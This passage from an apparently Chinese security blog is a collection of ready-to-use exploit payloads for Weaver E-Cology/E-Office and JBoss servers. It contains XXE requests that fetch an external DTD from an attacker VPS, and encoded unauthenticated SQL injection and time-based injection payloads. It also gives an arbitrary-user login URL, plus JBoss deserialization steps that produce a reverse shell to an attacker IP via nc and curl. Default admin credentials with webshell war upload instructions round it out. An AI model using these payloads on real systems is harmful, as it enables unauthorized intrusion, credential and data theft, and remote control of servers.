+<h2 id="泛微E-Cology-XXE漏洞-QVD-2023-16177"><a href="#泛微E-Cology-XXE漏洞-QVD-2023-16177" class="headerlink" title="泛微E-Cology XXE漏洞(QVD-2023-16177)"></a>泛微E-Cology XXE漏洞(QVD-2023-16177)</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/17677321.html">https://www.cnblogs.com/pursue-security/p/17677321.html</a></p>
+<p>版本：泛微 EC 9.x 且补丁版本 &lt; 10.58.2；泛微 EC 8.x 且补丁版本 &lt; 10.58.2</p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/rest/ofs/ReceiveCCRequestByXml</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">your-ip</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/xml</span></span>
+ 
+&lt;M>&lt;syscode>&amp;send;&lt;/syscode>&lt;/M><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240501105930731.png" alt="image-20240501105930731"></p>
+<p>exp1：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/rest/ofs/ReceiveCCRequestByXml</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> </span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/xml</span></span>
+<span class="token application-xml">
+<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">syscode</span> <span class="token name">SYSTEM</span> <span class="token string">"http://VPS:5555/1.txt"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>M</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>syscode</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&send;">&amp;send;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>syscode</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>M</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>exp2：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/rest/ofs/deleteUserRequestInfoByXml</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">your-ip</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/xml</span></span>
+<span class="token application-xml">
+<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">syscode</span> <span class="token name">SYSTEM</span> <span class="token string">"http://VPS:5555/1.txt"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>M</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>syscode</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&send;">&amp;send;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>syscode</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>M</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>两个exp的区别在于漏洞路径不一样</p>
+<hr>
+<h2 id="泛微OA-E-Cology9未授权SQL注入漏洞-CNVD-2023-12632"><a href="#泛微OA-E-Cology9未授权SQL注入漏洞-CNVD-2023-12632" class="headerlink" title="泛微OA E-Cology9未授权SQL注入漏洞(CNVD-2023-12632)"></a>泛微OA E-Cology9未授权SQL注入漏洞(CNVD-2023-12632)</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Trouble_99/article/details/129639082">https://blog.csdn.net/Trouble_99/article/details/129639082</a></p>
+<p>版本：泛微e-cology V9 &lt; 10.56</p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/mobile/plugin/browser.jsp</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">x.x.x.x</span></span>
+<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">x-forwarded-for</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
+<span class="token header"><span class="token header-name keyword">x-originating-ip</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
+<span class="token header"><span class="token header-name keyword">x-remote-ip</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
+<span class="token header"><span class="token header-name keyword">x-remote-addr</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">649</span></span>
+
+isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查询数据库版本信息，执行语句需要进行三次url编码</p>
+<p>批量验证脚本：<a target="_blank" rel="noopener" href="https://github.com/SharpKean/CNVD-2023-12632_POC">https://github.com/SharpKean/CNVD-2023-12632_POC</a></p>
+<hr>
+<h2 id="泛微-e-cology-ofsLogin任意用户登录漏洞"><a href="#泛微-e-cology-ofsLogin任意用户登录漏洞" class="headerlink" title="泛微 e-cology  ofsLogin任意用户登录漏洞"></a>泛微 e-cology  ofsLogin任意用户登录漏洞</h2><p>版本：部分 e-cology9 并且补丁版本 &lt; 10.57</p>
+<p>工具：<a target="_blank" rel="noopener" href="https://github.com/A0WaQ4/Weaver_ofslogin_vul">https://github.com/A0WaQ4/Weaver_ofslogin_vul</a></p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">/mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&amp;loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&amp;receiver=1&amp;syscode=1&amp;timestamp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="泛微E-Cology-x2F-CheckServer-jsp-路径SQL注入漏洞-QVD-2023-9849"><a href="#泛微E-Cology-x2F-CheckServer-jsp-路径SQL注入漏洞-QVD-2023-9849" class="headerlink" title="泛微E-Cology &#x2F;CheckServer.jsp 路径SQL注入漏洞(QVD-2023-9849)"></a>泛微E-Cology &#x2F;CheckServer.jsp 路径SQL注入漏洞(QVD-2023-9849)</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/17677217.html">https://www.cnblogs.com/pursue-security/p/17677217.html</a></p>
+<p>版本：泛微 Ecology 9.x &lt;&#x3D; v10.56；泛微 Ecology 8.x &lt;&#x3D; v10.56</p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/mobile/plugin/CheckServer.jsp?type=mobileSetting</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">***</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>访问<code>/mobile/plugin/CheckServer.jsp?type=mobileSetting</code> ，返回状态码200且参数值为<code>&#123;“error”;”system error”&#125;</code></p>
+<p>payload：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1%2F**%2Fand(select%2F**%2F1)%3E0%2F**%2Fwaitfor%2F**%2Fdelay'0%3A0%3A10'%2F**%2F</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> </span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240501111004395.png" alt="image-20240501111004395"></p>
+<hr>
+<h2 id="泛微E-Office-UserSelect未授权访问漏洞"><a href="#泛微E-Office-UserSelect未授权访问漏洞" class="headerlink" title="泛微E-Office UserSelect未授权访问漏洞"></a>泛微E-Office UserSelect未授权访问漏洞</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43981050/article/details/132075712">https://blog.csdn.net/weixin_43981050/article/details/132075712</a></p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/UserSelect/</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240501111319829.png" alt="image-20240501111319829"></p>
+<hr>
+<h2 id="泛微OA-E-Office-mysql-config-ini-数据库信息泄漏漏洞"><a href="#泛微OA-E-Office-mysql-config-ini-数据库信息泄漏漏洞" class="headerlink" title="泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞"></a>泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞</h2><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43981050/article/details/132075712">https://blog.csdn.net/weixin_43981050/article/details/132075712</a></p>
+<p>poc：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/mysql_config.ini</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240501111307797.png" alt="image-20240501111307797"></p>
+<hr>
+<h1 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h1><blockquote>
+<p>JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB  2.0和EJB3规范。但JBoss核心服务不包括支持servlet&#x2F;JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得JBoss广为流行</p>
+</blockquote>
+<p>探测工具：<a target="_blank" rel="noopener" href="https://github.com/GGyao/jbossScan">https://github.com/GGyao/jbossScan</a></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1944144">https://cloud.tencent.com/developer/article/1944144</a></p>
+<p><a target="_blank" rel="noopener" href="http://sectime.top/post/9957.html">http://sectime.top/post/9957.html</a></p>
+<h2 id="JBOSSApplication-Server反序列化命令执行漏洞（CVE-2017-12149）"><a href="#JBOSSApplication-Server反序列化命令执行漏洞（CVE-2017-12149）" class="headerlink" title="JBOSSApplication Server反序列化命令执行漏洞（CVE-2017-12149）"></a>JBOSSApplication Server反序列化命令执行漏洞（CVE-2017-12149）</h2><p>poc：</p>
+<p>访问<code>http://192.168.1.8:8080/invoker/readonly</code>，若返回如下界面则存在漏洞</p>
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240502141847135.png" alt="image-20240502141847135"></p>
+<p>exp：<a target="_blank" rel="noopener" href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">javac <span class="token parameter variable">-cp</span> .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 
+
+<span class="token function">java</span> <span class="token parameter variable">-cp</span> .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap <span class="token number">192.168</span>.220.133:8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>在攻击机上开启端口监听：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>向目标发送payload：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://192.168.220.151:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后就弹shell了</p>
+<hr>
+<h2 id="JMXInvokerServlet-反序列化漏洞（CVE-2015-7501）"><a href="#JMXInvokerServlet-反序列化漏洞（CVE-2015-7501）" class="headerlink" title="JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）"></a>JMXInvokerServlet 反序列化漏洞（CVE-2015-7501）</h2><p>JBoss在<code>/invoker/JMXInvokerServlet</code>请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码</p>
+<p>原理：</p>
+<p>跟之前的CVE-2017-12149漏洞相似，都是使用了java的反序列化，该漏洞为 Java反序列化错误类型，存在于 Jboss 的  HttpInvoker 组件中的 ReadOnlyAccessFilter  过滤器中没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，JBoss在&#x2F;invoker&#x2F;JMXInvokerServlet请求中读取了用户传入的对象，从而导致了漏洞</p>
+<p>poc：</p>
+<p>访问<code>http://192.168.1.8:8080/invoker/JMXInvokerServlet</code>弹出对话框则存在漏洞</p>
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240502142513285.png" alt="image-20240502142513285"></p>
+<p>和CVE-2017-12149一样使用java编译生成一个ser文件执行，使用nc监听端口即可得到反弹shell</p>
+<hr>
+<h2 id="JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a>JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</h2><p>原理：</p>
+<p>CVE-2017-7504漏洞与CVE-2015-7501的漏洞原理相似，只是利用的路径稍微出现了变化，CVE-2017-7504出现在&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet路径下。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation  Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码</p>
+<p>poc：</p>
+<p>访问<code>http://192.168.1.10:8080/jbossmq-httpil/HTTPServerILServlet</code>，若出现如下界面则存在漏洞：</p>
+<p><img src="/blog/2023/10/25/CMS%E7%9A%84Payload%E6%94%B6%E9%9B%86/image-20240502142710848.png" alt="image-20240502142710848"></p>
+<p>使用nc打开端口监听，再用之前生成的.ser文件，通过POST二进制数据上去，使用nc监听端口，即可拿到shell</p>
+<hr>
+<h2 id="JMX-Console-HtmlAdaptor-Getshell（CVE-2007-1036）"><a href="#JMX-Console-HtmlAdaptor-Getshell（CVE-2007-1036）" class="headerlink" title="JMX Console HtmlAdaptor Getshell（CVE-2007-1036）"></a>JMX Console HtmlAdaptor Getshell（CVE-2007-1036）</h2><p>原理：</p>
+<p>该漏洞利用的是后台中<code>jboss.admin -&gt; DeploymentFileRepository -&gt;  store()</code>方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器，arg1和arg2可以进行文件的拼接，例如arg1&#x3D;she，arg2&#x3D;ll.jsp。这个时候服务器还是会进行拼接，将shell.jsp传入到指定路径下</p>
+<p><del>太老了，不看了</del></p>
+<hr>
+<h2 id="JBoss控制台弱口令"><a href="#JBoss控制台弱口令" class="headerlink" title="JBoss控制台弱口令"></a>JBoss控制台弱口令</h2><p>在jboss的6.x版本里面存在弱口令</p>
+<ul>
+<li>jmx-console：admin&#x2F;admin、jboss&#x2F;jboss</li>
+<li>admin-console：admin&#x2F;admin、jboss&#x2F;jboss</li>
+</ul>
+<p>使用弱口令登陆后台并上传war包：</p>
+<ol>
+<li>进入jmx-console后台；</li>
+<li>找到jboss.deployment，点击flavor&#x3D;URL,type&#x3D;DeploymentScanner；</li>
+<li>找到void.addURL()，在输入框中写入一个war包地址，war包包含一个webshell；</li>
+<li>点击invoke获取一个jsp的webshell地址；</li>
+</ol>
+<p>上传成功，使用冰蝎连接即可</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
